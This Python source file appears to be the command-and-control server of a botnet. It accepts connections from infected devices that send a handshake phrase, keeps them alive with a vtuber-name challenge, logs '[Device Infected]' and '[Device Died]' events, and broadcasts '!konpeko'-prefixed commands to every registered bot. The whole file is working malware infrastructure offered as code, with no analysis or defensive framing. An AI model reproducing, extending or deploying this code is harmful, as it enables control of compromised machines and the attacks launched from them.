import threading
import socket
import time

import main

clients = [] # client sockets
addr_clients = [] # client ivp4 address

dup_clients = [] # dup sockets

clients_lock = threading.Lock()

vtubers = ["okayu", "shion", "watame", "laplus", "pekora"]

def handle_client(client: socket.socket, addr):
    client.settimeout(7)
    scp = "ay cuh open the connection for me cuh! "
    try:
        msg = client.recv(1024).decode()
    except Exception as e:
        #print(f"[broadcast] IP {addr[1]} connect but sent no data. Closing connection for {addr[1]}, Error: {e}")
        client.close()
        return
    
    is_legit_client = False
    rd = False
    dup = False

    try:
        if msg.startswith(scp):
            parts = msg.split(scp)
            # if len(parts)  == 2 and '/bin/' in parts[1]:
            if len(parts)  == 2:

                pass
            else:
                client.close()
                return
                
            new_part = parts[1]

            while True:
                time.sleep(2)

                client.send(b"Who is the best hololive girl?")
                data = client.recv(1024).decode()
                if data in vtubers:
                    if not is_legit_client:
                        is_legit_client = True
                        if addr[0] not in addr_clients:
                            print(f"[Device Infected] {addr[0]}:{addr[1]} {new_part}")
                            rd = True
                            with clients_lock:
                                clients.append(client)
                                addr_clients.append(addr[0])
                        elif addr[0] in addr_clients and client not in clients:
                            dup = True
                            with clients_lock:
                                dup_clients.append(client)
                else:
                    break

            if rd:
                with clients_lock:
                    if client in clients:
                        clients.remove(client)
                        addr_clients.remove(addr[0])
                print(f"[Device Died] {addr[0]}:{addr[1]}")
            elif dup:
                with clients_lock:
                    if client in dup_clients:
                        dup_clients.remove(client)

            client.close()
        else:
            client.close()

    except Exception as e:
        client.close()
        #print(f"Exception occurred for client {addr}: {e}")
        if rd:
            with clients_lock:
                if client in clients:
                    clients.remove(client)
                    addr_clients.remove(addr[0])
            print(f"[Device Died] {addr[0]}:{addr[1]}")
        elif dup:
            with clients_lock:
                if client in dup_clients:
                    dup_clients.remove(client)

def message(msg: str):
    try:

        with clients_lock:
            all_clients = clients + dup_clients
            for client_socket in all_clients:
                try:
                    client_socket.sendall(f"!konpeko konpeko konpeko! {msg}".encode())
                except Exception as e:
                    print(f"Error: {e}")
                    pass
            if not all_clients:
                pass
    except Exception as e:
        print(f"Error: {e}")
        pass

def brd_init():
    telnet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        telnet.bind((main.server_addr, 61527))
    except:
        print("[broadcast] Failed to bind")
        exit()
    
    telnet.listen(socket.SOMAXCONN)
    print("[broadcast] Server listening")

    try:
        while 1:
            client, addr = telnet.accept()
            threading.Thread(target=handle_client, args=(client, addr,)).start()

    except:
        pass
